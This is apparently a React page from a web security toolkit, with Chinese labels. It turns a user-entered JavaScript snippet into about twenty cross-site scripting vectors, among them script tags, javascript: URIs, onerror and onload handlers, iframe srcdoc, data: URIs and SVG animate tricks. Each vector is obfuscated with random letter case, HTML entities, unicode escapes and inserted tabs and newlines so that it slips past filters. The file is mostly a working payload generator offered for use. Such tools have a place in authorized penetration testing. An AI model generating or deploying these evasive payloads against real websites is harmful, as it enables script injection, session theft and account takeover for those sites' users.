import MainContent from '@/components/MainContent';

import { Box, Button, Grid, Stack, Typography } from '@mui/material';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { a11yDark } from 'react-syntax-highlighter/dist/esm/styles/hljs';

import TextField from '@mui/material/TextField';

import React, { useCallback, useEffect, useState } from 'react';
import { encode as html_entity_encode } from 'html-entities';

const base64_encode = (str: string): string =>
  Buffer.from(str, 'utf-8').toString('base64');

function randomizeCase(input: string): string {
  return input
    .split('')
    .map((char) => {
      const randomNumber = Math.random();
      if (randomNumber < 0.4) {
        return char.toUpperCase();
      } else {
        return char.toLowerCase();
      }
    })
    .join('');
}

function randomizeEntity(input: string): string {
  return input
    .split('')
    .map((char) => {
      const randomNumber = Math.random();
      if (char === ':') {
        return '&colon;';
      } else if (char === ';') {
        return '&semi;';
      } else if (char === "'") {
        return '&apos;';
      } else if (char === '"') {
        return '&quot;';
      } else if (char === ' ') {
        return '&nbsp;';
      } else if (char === '<') {
        return '&lt;';
      } else if (char === '>') {
        return '&gt;';
      } else if (char === '&') {
        return '&amp;';
      } else if (char === '\t') {
        return '&#x09;';
      } else if (char === '\n') {
        return '&#x0a;';
      } else if (randomNumber < 0.1) {
        return `&#${char.charCodeAt(0).toString()};`;
      } else if (randomNumber < 0.2) {
        return `&#x${char.charCodeAt(0).toString(16)};`;
      } else {
        return char;
      }
    })
    .join('');
}

function randomizeUnicode(input: string): string {
  return input
    .split('')
    .map((char) => {
      const randomNumber = Math.random();
      if (randomNumber < 0.2) {
        return `\\u${('0000' + char.charCodeAt(0).toString(16)).slice(-4)}`;
      } else {
        return char;
      }
    })
    .join('');
}

const XSS: React.FC = () => {
  const [src, setSrc] = useState<string>('alert()');
  const [input, setInput] = useState<string>('alert()');
  const [codes, setCodes] = useState<Array<string>>([]);

  const updateCode = () => {
    setCodes([
      `<${randomizeCase('script')}>${randomizeUnicode(input)}</${randomizeCase(
        'script'
      )}>`,
      `<${randomizeCase('a')} ${randomizeCase('href')}="${randomizeEntity(
        javascriptURI()
      )}">XSS</${randomizeCase('a')}>`,
      `<${randomizeCase('body')} ${randomizeCase('onload')}="${randomizeEntity(
        input
      )}">`,
      `<${randomizeCase('embed')} ${randomizeCase('src')}="${randomizeEntity(
        javascriptURI()
      )}">`,
      `<${randomizeCase('form')} ${randomizeCase('action')}="${randomizeEntity(
        javascriptURI()
      )}"><${randomizeCase('input')} type=submit value=XSS>`,
      `<${randomizeCase('form')} ${randomizeCase('action')}="${randomizeEntity(
        javascriptURI()
      )}"><${randomizeCase('input')} type=submit id=x></form><${randomizeCase(
        'label'
      )} for=x>XSS</${randomizeCase('label')}>`,
      `<${randomizeCase('form')}><${randomizeCase('button')} ${randomizeCase(
        'formaction'
      )}="${randomizeEntity(javascriptURI())}">XSS</${randomizeCase(
        'button'
      )}>`,
      `<${randomizeCase('form')}><${randomizeCase(
        'input'
      )} type=submit ${randomizeCase('formaction')}="${randomizeEntity(
        javascriptURI()
      )}" value=XSS>`,
      `<${randomizeCase('iframe')} ${randomizeCase(
        'srcdoc'
      )}="${html_entity_encode(
        "<img src=1 onerror='"
      )}${input}'>"></${randomizeCase('iframe')}>`,
      `<${randomizeCase('iframe')} ${randomizeCase('src')}="${randomizeEntity(
        javascriptURI()
      )}"></${randomizeCase('iframe')}>`,
      `<${randomizeCase('img')} src=x ${randomizeCase(
        'onerror'
      )}="${html_entity_encode(input)}">`,
      `<${randomizeCase(
        'meta'
      )} http-equiv="refresh" content="0; url=${randomizeEntity(
        javascriptURI()
      )}">`,
      `<${randomizeCase('object')} ${randomizeCase('data')}="${randomizeEntity(
        javascriptURI()
      )}">`,
      `<${randomizeCase('script')} ${randomizeCase(
        'src'
      )}="data:text/javascript,${input}"></${randomizeCase('script')}>`,
      `<${randomizeCase(
        'script'
      )}>import('data:text/javascript,${input}')</${randomizeCase('script')}>`,
      `<${randomizeCase('svg')}><${randomizeCase(
        'animate'
      )} xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;${randomizeEntity(
        javascriptURI()
      )}&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>`,
      `<${randomizeCase('svg')}><${randomizeCase(
        'a'
      )} xlink:href="${randomizeEntity(javascriptURI())}"><${randomizeCase(
        'text'
      )} x="20" y="20">XSS</text></${randomizeCase('a')}>`,
      `<${randomizeCase('svg')}><${randomizeCase(
        'animate'
      )} xlink:href=#xss attributeName=href values="${randomizeEntity(
        javascriptURI()
      )}" /><${randomizeCase(
        'a'
      )} id=xss><text x=20 y=20>XSS</text></${randomizeCase('a')}>`,
      `<${randomizeCase('svg')}><${randomizeCase(
        'animate'
      )} xlink:href=#xss attributeName=href from="${randomizeEntity(
        javascriptURI()
      )}" to=1 /><${randomizeCase(
        'a'
      )} id=xss><text x=20 y=20>XSS</text></${randomizeCase('a')}>`,
      `<${randomizeCase('svg')}><${randomizeCase(
        'set'
      )} xlink:href=#xss attributeName=href from=? to="${randomizeEntity(
        javascriptURI()
      )}" /><${randomizeCase(
        'a'
      )} id=xss><text x=20 y=20>XSS</text></${randomizeCase('a')}>`,
    ]);
  };

  useEffect(() => {
    updateCode();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const onSrcChange = useCallback(
    (event: React.ChangeEvent<HTMLInputElement>) => {
      setSrc(event.target.value);
      setInput(event.target.value);
    },
    [src]
  );

  const onBtnClick = useCallback(
    (event: React.MouseEvent<HTMLElement>) => {
      setInput(src);
      updateCode();
    },
    [input, src]
  );

  const javascriptURI = () => {
    return `${randomizeCase(
      insertRandomChar('javascript', ['\t', '\n'])
    )}:${input};`;
  };

  const insertRandomChar = (
    inputString: string,
    charactersToInsert: string[]
  ) => {
    let newString = '';
    for (let i = 0; i < inputString.length; i++) {
      newString += inputString[i];
      if (i < inputString.length - 1) {
        let randomIndex = Math.floor(Math.random() * charactersToInsert.length);
        newString += charactersToInsert[randomIndex];
      }
    }
    return newString;
  };

  return (
    <MainContent>
      <Box sx={{ width: '100%', typography: 'body1' }}>
        <Stack spacing={2}>
          <Grid container>
            <Grid item xs={8}>
              <Typography variant='subtitle2' sx={{ lineHeight: '36px' }}>
                JS 代码
              </Typography>
            </Grid>
            <Grid item xs={4} sx={{ textAlign: 'right' }}>
              <Button onClick={onBtnClick} variant='contained'>
                生成
              </Button>
            </Grid>
          </Grid>
          <TextField
            value={src}
            variant='outlined'
            multiline
            rows={3}
            onChange={onSrcChange}
            sx={{
              textarea: { fontSize: '14px', fontFamily: 'Mono' },
              marginTop: '6px !important',
              marginBottom: '30px !important',
            }}
          />
          <Typography variant='subtitle2'>XSS 向量</Typography>
          <SyntaxHighlighter style={a11yDark}>
            {codes.join('\n\n')}
          </SyntaxHighlighter>
        </Stack>
      </Box>
    </MainContent>
  );
};

export default XSS;
